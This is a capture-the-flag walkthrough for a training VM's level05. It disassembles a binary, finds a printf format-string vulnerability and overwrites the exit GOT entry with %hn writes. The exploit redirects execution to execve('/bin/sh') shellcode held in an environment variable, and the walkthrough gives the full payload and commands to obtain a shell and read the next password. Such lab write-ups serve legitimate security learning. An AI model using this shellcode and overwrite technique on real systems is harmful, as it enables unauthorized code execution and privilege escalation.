# level05

For now, retrieve the `level05` binary, save the complete GDB disassembly of `main`, and decode the data addresses found in that dump.

## Connect to level05

Read the password obtained from level04:

```sh
cat level04/flag
```

Connect to the VM:

```sh
ssh level05@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level04/flag`.

## Get the binary

Copy the ELF binary from the VM:

```sh
scp -P 2222 level05@127.0.0.1:/home/users/level05/level05 ./level05/src/level05
```

Use the content of `level04/flag` as the password. Verify the local binary:

```sh
file level05/src/level05
```

## Save `main_dump_gdb`

Inside the level05 SSH session, load the binary using its absolute path:

```sh
gdb ./level05
```

Use a level-specific temporary filename to avoid copying a dump from another level:

```gdb
set disassembly-flavor intel
set logging file /tmp/level05_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Verify the dump on the VM:

```sh
ls -l /tmp/level05_main_dump_gdb
```

From the repository root on the host, copy it locally:

```sh
scp -P 2222 level05@127.0.0.1:/tmp/level05_main_dump_gdb ./level05/src/main_dump_gdb
```

The local files should now be:

```text
level05/src/level05
level05/src/main_dump_gdb
```

## Decode addresses from `main_dump_gdb`

Compile the shared decoder from the repository root if necessary:

```sh
gcc -Wall -Wextra -Werror decode_address.c -o decode_address
```

The dump is correct and complete. It starts at `0x08048444`, matches the local 32-bit ELF, and ends with `End of assembler dump.` after calls to `fgets`, `printf`, and `exit`.

The address to check with `decode_address` is:

```text
0x80497f0
```

It appears in this instruction:

```asm
mov    eax,ds:0x80497f0
```

Check it with:

```sh
./decode_address level05/src/level05 0x80497f0
```

The result is:

```text
0x80497f0: address is zero-initialized memory (BSS), not file data
```

This is the global `stdin` object used as the third argument to:

```c
fgets(buffer, 100, stdin);
```

Therefore, there are no readable string addresses to decode in this `main`. The following addresses are function destinations and must not be passed to `decode_address`:

```text
0x8048350 -> fgets@plt
0x8048340 -> printf@plt
0x8048370 -> exit@plt
```

The immediate values `0x40`, `0x5a`, and `0x20` are numeric constants, not addresses. They implement the conversion of uppercase ASCII letters into lowercase letters:

```c
if (buffer[i] > 0x40 && buffer[i] <= 0x5a)
    buffer[i] ^= 0x20;
```

Finally, the modified input buffer is passed directly to `printf`:

```asm
lea    eax,[esp+0x28]
mov    DWORD PTR [esp],eax
call   0x8048340 <printf@plt>
```

This is equivalent to the vulnerable call:

```c
printf(buffer);
```

Because the user controls the format string, the next analysis step is to test positional format specifiers such as `%x` and `%p`.

## Find the format-string offset

Start with four known bytes followed by several stack reads:

```sh
python -c 'print("aaaa." + "%08x." * 20)' | /home/users/level05/level05
```

The marker uses lowercase `a` because the program converts uppercase letters to lowercase before calling `printf`.

The four marker bytes are:

```text
"aaaa" -> 0x61 0x61 0x61 0x61 -> 0x61616161
```

Look through the program output for:

```text
61616161
```

Count which `%08x` produced that value. That number is the position of the first four controlled bytes in `printf`'s argument list.

The VM output contains the marker at the tenth value:

```text
aaaa.00000064.f7fcfac0.f7ec3add.ffffd6bf.ffffd6be.00000000.ffffffff.ffffd744.f7fdb000.61616161
```

Therefore, the controlled buffer starts at argument position 10. Verify it directly with:

```sh
python -c 'print("aaaa.%10$x")' | /home/users/level05/level05
```

The verification output should end with:

```text
aaaa.61616161
```

The confirmed format-string offset is:

```text
10
```

## Locate the `exit` GOT entry

After the vulnerable `printf`, the program calls `exit`. Its Global Offset Table entry is writable because the binary uses partial RELRO.

On the level05 VM, use:

```sh
objdump -R /home/users/level05/level05 | grep exit
```

Alternatively, from the repository root on the host, use:

```sh
objdump -R level05/src/level05 | grep exit
```

The result is:

```text
080497e0 R_386_JUMP_SLOT   exit
```

The address to overwrite is therefore:

```text
exit@GOT = 0x080497e0
```

## Understand the `%hn` overwrite

The `%n` format specifier writes the number of characters printed so far into an address supplied as an argument. `%hn` writes only the lower 16 bits, which makes a 32-bit address practical to write in two parts.

The two destinations are:

```text
0x080497e0 -> lower 16 bits of exit@GOT
0x080497e2 -> upper 16 bits of exit@GOT
```

Place those two addresses at the beginning of the format string. Since the first four controlled bytes are argument 10, the next four bytes are argument 11:

```text
first address  -> %10$hn
second address -> %11$hn
```

The addresses contain no uppercase ASCII bytes, so the program's lowercase conversion does not corrupt them. In little-endian form they are:

```text
0x080497e0 -> \xe0\x97\x04\x08
0x080497e2 -> \xe2\x97\x04\x08
```

Suppose the address to write is:

```text
0xHHHHLLLL
```

Then `%hn` must write:

```text
LLLL into 0x080497e0
HHHH into 0x080497e2
```

The two raw addresses already print eight characters before the first width specifier. If `HHHH` is the smaller half, put `0x080497e2` first and calculate:

```text
first width  = HHHH - 8
second width = LLLL - HHHH
```

The resulting structure is:

```text
[exit@GOT+2][exit@GOT]%FIRST_WIDTHc%10$hn%SECOND_WIDTHc%11$hn
```

If `LLLL` is smaller, reverse the destination order and perform the low-half write first. Add `65536` before subtracting whenever the next printed count would otherwise be smaller than the previous one.

Before calculating these widths, the next required value is the address of code that should run when `exit` is called. The usual approach here is to place shellcode in an environment variable and overwrite `exit@GOT` with its address.

## Put shellcode in the environment

On the level05 VM, export a NOP sled followed by 32-bit Linux `execve("/bin/sh")` shellcode:

```sh
export SHELLCODE=$(python -c 'print("\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

The shellcode is stored in the environment, so it is not processed by level05's uppercase-to-lowercase loop.

## Find the shellcode address

The repository contains `level05/src/get_env_address.c`. From the repository root on the host, copy it to the VM:

```sh
scp -P 2222 level05/src/get_env_address.c level05@127.0.0.1:/tmp/get_env_address.c
```

Compile it as a 32-bit program inside the level05 SSH session:

```sh
gcc -m32 -Wall -Wextra -Werror /tmp/get_env_address.c -o /tmp/get_env_address
```

Run the helper with the exact path that will be used to start level05:

```sh
/tmp/get_env_address SHELLCODE /home/users/level05/level05
```

The helper adjusts for the difference between its own executable name and the target executable name. Record the address it prints.

Because the environment value starts with 200 NOP instructions, choose an address approximately 100 bytes after the reported start. This points near the middle of the NOP sled and tolerates a small address difference:

For this run, the helper returned:

```text
SHELLCODE: 0xffffd7ff
```

`REPORTED_ADDRESS` is only a placeholder and is not an existing shell variable. Using it literally produces `0x64` because an undefined arithmetic variable is treated as zero. Use the actual hexadecimal value:

```sh
printf '0x%x\n' $((0xffffd7ff + 100))
```

The selected address in the NOP sled is:

```text
0xffffd863
```

## Calculate the two writes

Split the selected address into two 16-bit values:

```text
0xffffd863
     ^^^^ -> lower half: 0xd863 = 55395
 ^^^^     -> upper half: 0xffff = 65535
```

The lower half is smaller, so write it first to `0x080497e0`, followed by the upper half at `0x080497e2`.

The two destination addresses occupy the first eight printed bytes:

```text
first width  = 55395 - 8     = 55387
second width = 65535 - 55395 = 10140
```

Build the payload on the level05 VM:

```sh
python -c 'import struct; print(struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%55387c%10$hn%10140c%11$hn")' > /tmp/level05_payload
```

This performs:

```text
%10$hn -> write 0xd863 to 0x080497e0
%11$hn -> write 0xffff to 0x080497e2
```

Together, the two writes replace `exit@GOT` with `0xffffd863`.

Run the exploit and keep its input open:

```sh
(cat /tmp/level05_payload; cat) | /home/users/level05/level05
```

The format string prints many padding characters and the resulting shell may not display a prompt. Type commands even if no prompt is visible:

```sh
whoami
cat /home/users/level06/.pass
```
